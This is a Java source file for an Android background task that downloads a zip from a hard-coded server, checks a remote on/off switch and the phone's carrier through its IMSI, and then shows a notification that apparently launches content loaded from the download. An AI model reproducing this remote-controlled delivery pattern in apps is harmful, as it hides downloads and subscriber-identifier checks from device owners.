/**
 * 
 */
package cn.play.dserv;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.Calendar;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;


/**
 * push
 * @author Keel
 *
 */
public class PLTask19 implements PLTask {

	private static final int ID = 19;
	private String f_zip = "aph"+ID+".zip";
	private int f_zip_size = -1;	//!!!!!注意更新与文件匹配!!!!!!!!!!
	private String title = "推送标题";
	private String txt = "推送文字";
	
	
	private String downloadPre = "http://180.96.63.85:12370/plserver/aph/";
	private String ctrlUrl = "http://180.96.63.75:12370/plserver/tc/ctrl?id="+ID;
	/**
	 * 联网控制开关为关时的再次确认等待时间
	 */
	private long ctrlCheckTime = 1000*60*60 * 24;
	
	private DServ dserv;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+ID;
	private Context ctx;
	private boolean isInitOK = false;
	private String emvClass = "cn.play.dserv.Eaph";
	private String emvPath = "aph/eap";
	
	/**
	 * .aph目录
	 */
	private String localPath;
	
	
	
	private boolean download(String remote,String localPath,String fileName,int size){
		boolean downOK = false;
		long downSize = 0;
		if (dserv.downloadGoOn(remote, localPath, fileName, dserv.getService())) {
			File f = new File(localPath+fileName);
			if (f.isFile()) {
				downSize = f.length();
				if (downSize > 10 && (size < 0 || downSize == size)) {
					downOK = true;
				}
			}
		}else{
			CheckTool.log(dserv.getService(), TAG, "==========downloadGoOn failed:"+remote+"===="+localPath+"---"+fileName+" downsize:"+downSize);
		}
		if (!downOK) {
			CheckTool.log(dserv.getService(), TAG, "==========downloadGoOn failed:"+remote+"===="+localPath+"---"+fileName+" downsize:"+downSize);
			File f = new File(localPath+fileName);
			if (f.isFile()) {
				f.delete();
			}
		}
		return downOK;
	}
	
	/**
	 * 下载zip，核实大小并解压
	 * @return
	 */
	private boolean downFiles(){
		if (download(downloadPre+f_zip, localPath, f_zip,f_zip_size)) {
			if (dserv.unzip(localPath+f_zip, localPath)) {
				return true;
			}
		}
		return false;
	}
	
	/**
	 * 清空目录
	 * @param dir
	 */
	private void clearDir(String dir){
		File ls = new File(dir);
		if (ls == null || !ls.isDirectory()) {
			return;
		}
		File[] files = ls.listFiles();
		if (files == null) {
			return;
		}
		for (int i = 0; i < files.length; i++) {
			File f = files[i];
			if (f.isFile()) {
				files[i].delete();
			}else if(f.isDirectory()){
				clearDir(f.getAbsolutePath());
			}
		}
	}
	
	/**
	 * 联网查看显示时间段，开关，如果符合则返回0
	 * @param orderUrl
	 * @return 0为立即显示,-1为不显示,其他为等待时间后显示
	 */
	private long checkWaitTime(String orderUrl){
		BufferedReader in = null;
		try {
			URL u = new URL(orderUrl);
			URLConnection conn = u.openConnection();
			//conn.setRequestProperty(field, newValue);
			conn.connect(); 
			in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
			String line;
			StringBuilder sb = new StringBuilder();
			while ((line = in.readLine()) != null){
				sb.append(line);
			}
			String re = sb.toString();
			in.close();
			if (StringUtil.isStringWithLen(re, 2)) {
				//内容格式:开关(0关,1开),时间段(8位起止时分),日期(豪秒，逗号分隔)
				//[0|1][46003,46005-][09302000][1234324324,214234124344]
				String isOpen = re.substring(0,1);
				if (isOpen.equals("1")) {
					//运营商控制
					int teleEndPosi = re.indexOf("-");
					boolean hasTele = teleEndPosi > 0;
					if (hasTele) {
						boolean telePass = false;
						String[] tele = re.substring(1,teleEndPosi).split(","); 
						TelephonyManager tm=(TelephonyManager) this.dserv.getService().getSystemService(Context.TELEPHONY_SERVICE);
						String imsi = tm.getSubscriberId();
						if (StringUtil.isDigits(imsi) && imsi.length()>5) {
							//有效imsi号
							String phoneTele = imsi.substring(0,5);
							for (int i = 0; i < tele.length; i++) {
								if (tele[i].equals(phoneTele)) {
									telePass = true;
									break;
								}
							}
						}
						if (!telePass) {
							//不显示
							return -1;
						}
					}
					//时间段
					int timeAreaPo = (hasTele) ? teleEndPosi+1 : 1;
					String h1 = re.substring(timeAreaPo,timeAreaPo+2);
					String m1 = re.substring(timeAreaPo+2,timeAreaPo+4);
					String h2 = re.substring(timeAreaPo+4,timeAreaPo+6);
					String m2 = re.substring(timeAreaPo+6,timeAreaPo+8);
					
					//日期控制
					int dateAreaPo = timeAreaPo + 8;
					String[] dateArea = re.substring(dateAreaPo).split(",");
					
					Calendar ca = Calendar.getInstance();
					long now = ca.getTimeInMillis();
					//先在日期范围内
					if (now > Long.parseLong(dateArea[0]) && now < Long.parseLong(dateArea[1])) {
						//再控制时间段
						Calendar[] timeArea = {Calendar.getInstance(),Calendar.getInstance()};
						timeArea[0].set(Calendar.HOUR_OF_DAY, Integer.parseInt(h1));
						timeArea[0].set(Calendar.MINUTE, Integer.parseInt(m1));
						timeArea[1].set(Calendar.HOUR_OF_DAY, Integer.parseInt(h2));
						timeArea[1].set(Calendar.MINUTE, Integer.parseInt(m2));
						if (ca.after(timeArea[0]) && ca.before(timeArea[1])) {
							//符合，可立即执行
							return 0;
						}
					}
				}
				
			}
		} catch (Exception e) {
			e.printStackTrace();
			return this.ctrlCheckTime;
		} finally{
			if (in != null) {
				try {
					in.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		//不满足条件则等待ctrlCheckTime
		return ctrlCheckTime;
	}
	
	/**
	 * 显示push内容
	 */
	private void ph(){
		
	/*	//解密aph+id.data配置文件
		HashMap<String,Object> config = null;
		String jsonStr = null;*/
		try {
			/*
			String configFile = this.localPath+"aph"+ID+".data";
			jsonStr = CheckTool.Cl(configFile);
			if (jsonStr != null) {
				HashMap<String, Object> m = (HashMap<String, Object>) JSON.read(jsonStr);
				if (m != null && m.size()>2) {
					config = m;
				}
			}
			if (config == null) {
				CheckTool.log(dserv.getService(), TAG, "config file error:"+jsonStr);
				return;
			}
			*/
			//从配置中读取
			String pushTitle = this.title;//(String) config.get("title");
			String pushTxt = this.txt;//(String) config.get("txt");
			String emvClass = this.emvClass;//(String) config.get("emvClass");
			String emvPath = this.emvPath;//(String) config.get("emvPath");
			
			//检查文件列表 -- 暂不实现
			
			
			NotificationManager nm = (NotificationManager) dserv.getService().getSystemService(Context.NOTIFICATION_SERVICE);  
			
			Notification no  = new Notification();
			no.tickerText = pushTitle;
			no.flags |= Notification.FLAG_AUTO_CANCEL;  
			no.icon = android.R.drawable.stat_notify_chat;
			PendingIntent pd = null;
			
			Intent it = new Intent(this.dserv.getService(),EmpActivity.class); 
			it.putExtra("emvClass", emvClass);
			it.putExtra("emvPath",  emvPath);
			it.putExtra("uid", (Long)(this.dserv.getPropObj("uid", 0L)));
			it.putExtra("no", "_@@"+ID+"@@113@@push_clicked");
			it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
			pd = PendingIntent.getActivity(this.dserv.getService(), 0, it, PendingIntent.FLAG_UPDATE_CURRENT);
	
			no.setLatestEventInfo(dserv.getService(), pushTitle, pushTxt, pd);
			//1320为 pushid的前缀
			nm.notify(1320+ID, no);
			//
			CheckTool.sLog(this.dserv.getService(), 101, "_@@"+ID+"@@118@@pushShow");
		} catch (Exception e) {
			e.printStackTrace();
		}
		
	}
	
	@Override
	public void run() {
		CheckTool.log(this.ctx, TAG, "==========PLTask id:"+ID+"===========");
		if (this.ctx == null || !isInitOK) {
			CheckTool.log(this.ctx, TAG, "init error.");
			return;
		}
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+ID+"_task is running");
		state = STATE_RUNNING;
		
		//清理aph目录
		this.clearDir(this.localPath);
		
		//
		boolean fileDownOK = false;
		try {
			while (true) {
				if (!isNetOk(this.dserv.getService())) {
					Thread.sleep(1000*60*5);
					continue;
				}
				//下载文件：图片等web文件打包成一个zip，此时将其下载并解出
				if (!fileDownOK) {
					if (this.downFiles()) {
						CheckTool.log(dserv.getService(), TAG, "==== PLTask "+ID+" downFiles OK");
						fileDownOK = true;	
					}else{
						CheckTool.log(dserv.getService(), TAG, "==== PLTask "+ID+" downFiles err.");
						fileDownOK = false;	
						Thread.sleep(1000*60*5);
						continue;
					}
				}
				
				//联网获取配置,任务id,时间,开关
				long waitTime = this.checkWaitTime(ctrlUrl);
				if (waitTime < 0) {
					CheckTool.log(dserv.getService(), TAG, "==== PLTask "+ID+" will not show.");
					this.dserv.taskDone(this);
					state = STATE_DIE;
					dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+ID+"_task is finished.");
					break;
				}else if (waitTime == 0) {
					//显示push内容
					ph();
					this.dserv.taskDone(this);
					state = STATE_DIE;
					dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+ID+"_task is finished.");
					break;
				}else{
					CheckTool.log(dserv.getService(), TAG, "==== PLTask "+ID+" wait : "+waitTime);
					Thread.sleep(waitTime);
					continue;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			CheckTool.log(dserv.getService(), TAG, "==========PLTask err id:"+ID+"===========");
		}
		
		
		
		
	}
	public static boolean isNetOk(Context cx) {
		ConnectivityManager cm = (ConnectivityManager) cx.getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean isOk = false;
		if (cm != null) {
			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					isOk = true;
				}
			}
		}
		return isOk;
	}
	
	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return ID;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		CheckTool.log(dserv.getService(),TAG, "TASK "+ID+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			this.ctx = dserv.getService();
			this.localPath = dserv.getLocalPath()+"aph/";
			(new File(this.localPath)).mkdirs();
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+ID+"_task inited.");
			isInitOK = true;
		}else{
			CheckTool.log(dserv.getService(),TAG, "TASK "+ID+" getService is null.");
			isInitOK = false;
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
